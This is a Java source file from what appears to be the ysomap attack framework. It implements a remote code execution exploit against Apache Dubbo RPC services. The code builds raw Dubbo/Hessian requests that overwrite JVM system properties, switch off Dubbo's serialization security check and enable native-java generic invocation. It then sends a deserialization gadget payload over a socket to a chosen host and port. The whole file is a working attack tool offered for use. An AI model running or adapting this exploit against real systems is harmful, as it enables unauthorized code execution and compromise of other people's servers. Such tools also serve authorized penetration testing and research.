package ysomap.exploits.dubbo;

import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import com.alibaba.com.caucho.hessian.io.SerializerFactory;
import org.apache.commons.codec.DecoderException;
import ysomap.common.annotation.*;
import ysomap.common.util.Status;
import ysomap.core.serializer.Serializer;
import ysomap.core.util.ByteHelper;
import ysomap.core.util.SocketHelper;
import ysomap.exploits.AbstractExploit;
import ysomap.payloads.Payload;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.*;

/**
 * @author wh1t3p1g
 * @since 2023/4/3
 */
@Exploits
@Authors({Authors.WH1T3P1G})
@Require(bullets = {}, param = false)
@Details("dubbo rpc 反序列化漏洞")
public class DubboRPC3Exploit extends AbstractExploit {

    @NotNull
    @Require(name = "host", detail = "目标IP")
    public String host = null;

    @NotNull
    @Require(name = "port", type = "int",detail = "目标端口")
    public String port = "20880";

    @NotNull
    @Require(name = "service", detail = "可利用的service classname")
    public String service = null;

    @NotNull
    @Require(name = "method", detail = "可利用的service method，带有Object参数")
    public String method = null;

    @NotNull
    @Require(name = "paramTypes", detail = "可利用的service method 参数类型列表，使用,分隔")
    public String paramTypes = null;

    @NotNull
    @Require(name = "version", detail = "可利用的service version")
    public String version = null;

    @NotNull
    @Require(name = "osName", detail = "补充环境变量用于命令执行，OS X 或 Linux")
    public String osName = null;

    @NotNull
    @Require(name = "osArch", detail = "补充环境变量用于命令执行，amd64 或 aarch64")
    public String osArch = null;

    @NotNull
    @Require(name = "javaHome", detail = "补充环境变量用于命令执行，看docker")
    public String javaHome = null;

    @NotNull
    public Payload payload;
    public String payloadName;

    @Override
    public void work() {
        try {
            send(makeInstance(), "raw.return");
            send(makeCheckerClosed(), "raw.return");
            send(makeTrigger(), "nativejava");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void send(Object payload, String generic) throws DecoderException, IOException {
        byte[] data = generateRequest(payload, generic);
        String ret = SocketHelper.send(host, Integer.parseInt(port), data, 5000);
        System.out.println(ret);
    }

    @Override
    public void stop() {
        setStatus(Status.STOPPED);
    }


    enum SerializeType  {
        Hessian(2),
        Java(3),
        CompactedJava(4),
        FastJSON(6),
        NativeJava(7),
        Kryo(8),
        FST(9)
        ;

        private byte code;

        SerializeType(int code){
            this.code=(byte) code;
        }

        public byte getCode() {
            return code;
        }
    }

    enum ResponseType {
        RESPONSE_WITH_EXCEPTION(0),
        RESPONSE_VALUE(1),
        RESPONSE_WITH_EXCEPTION_WITH_ATTACHMENTS(3),
        RESPONSE_VALUE_WITH_ATTACHMENTS(4),
        RESPONSE_NULL_VALUE_WITH_ATTACHMENTS(5)
        ;

        public byte code;

        ResponseType(int code){
            this.code=(byte) code;
        }

        public byte getCode() {
            return code;
        }
    }

    public Map<String, Object> makeCheckerClosed(){
        Properties properties = new Properties();
        properties.setProperty("dubbo.security.serialize.generic.native-java-enable","true");
        properties.setProperty("serialization.security.check","false"); // 用于去除 org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode
        properties.setProperty("os.name", osName);
        properties.setProperty("os.arch", osArch);
//        properties.setProperty("os.arch","aarch64"); // amd64
//        properties.setProperty("os.arch","amd64"); // amd64
//        properties.setProperty("java.home","/usr/local/openjdk-8/jre");
        properties.setProperty("java.home", javaHome);
        properties.setProperty("java.specification.version", "1.8");
//        properties.setProperty("java.home","/Library/Java/JavaVirtualMachines/liberica-jdk-8.jdk/Contents/Home/jre");

        Map<String, Object> map1 = new HashMap<>();
        map1.put("class", "java.lang.System");
        map1.put("properties", properties);
        return map1;
    }

    public Object makeTrigger() throws Exception {
        Serializer serializer = ysomap.core.serializer.SerializerFactory.createSerializer("default");
        return serializer.serialize(payload.getObject());
    }

    private static Map makeInstance() throws IOException {
        HashMap map = new HashMap();
        map.put("class", "java.time.zone.TzdbZoneRulesProvider");
        return map;
    }

    // 参考 com.alibaba.dubbo.remoting.exchange.codec.ExchangeCodec#encodeRequest
    public byte[] generateRequest(Object payload, String generic) throws IOException, DecoderException {
        // header
        byte[] header = new byte[16];
        short MAGIC = (short) 0xdabb;
        byte FLAG_REQUEST = (byte) 0x80;
        ByteHelper.short2bytes(MAGIC, header);
        header[2] = (byte) (FLAG_REQUEST | SerializeType.Hessian.getCode());
        ByteHelper.long2bytes(new Random().nextInt(100000000), header, 4);
        // payload
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);
        SerializerFactory sf = new SerializerFactory();
        sf.setAllowNonSerializable(true);
        output.setSerializerFactory(sf);
        output.writeString("2.0.2"); // version

        String[] types = paramTypes.split(",");
        Object[] args = new Object[types.length];
        boolean flag = true;
        for(int i=0;i<types.length;i++){
            String type = types[i];
            if("java.lang.Object".equals(type) || "java.util.Map".equals(type)){
                args[i] = payload;
                flag = false;
            }else if("byte[]".equals(type) && "nativejava".equals(generic)){
                args[i] = payload;
                flag = false;
            }
            else{
                args[i] = null;
            }
        }
        if(flag){
            args[0] = payload;
        }

        output.writeString(service); // service
        output.writeString(version); // service version
        output.writeString("$invoke");
        output.writeString("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        output.writeString(method); // name
        output.writeObject(types); // types
        output.writeObject(args); // args

        HashMap hkhash = new HashMap();
        hkhash.put("generic", generic);
//        hkhash.put("generic", "nativejava");
        output.writeObject(hkhash);
        output.flush();
        output.close();
        // pack
        ByteHelper.int2bytes(baos.size(), header, 12);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        out.write(header);
        out.write(baos.toByteArray());

        return out.toByteArray();
    }

    public static byte[] generateResponse(Object payload) throws IOException, DecoderException {
        // header
        byte[] header = new byte[16];
        short MAGIC = (short) 0xdabb;
        ByteHelper.short2bytes(MAGIC, header);
        header[2] = SerializeType.Hessian.getCode();
        header[3] = (byte) 20; // status ok
        ByteHelper.long2bytes(new Random().nextInt(100000000), header, 4);
        // payload
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);
        SerializerFactory sf = new SerializerFactory();
        sf.setAllowNonSerializable(true);
        output.setSerializerFactory(sf);
        output.writeInt(ResponseType.RESPONSE_WITH_EXCEPTION.getCode());
        output.writeObject(payload);
        output.flush();
        output.close();
        // pack
        ByteHelper.int2bytes(baos.size(), header, 12);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        out.write(header);
        out.write(baos.toByteArray());

        return out.toByteArray();
    }
}
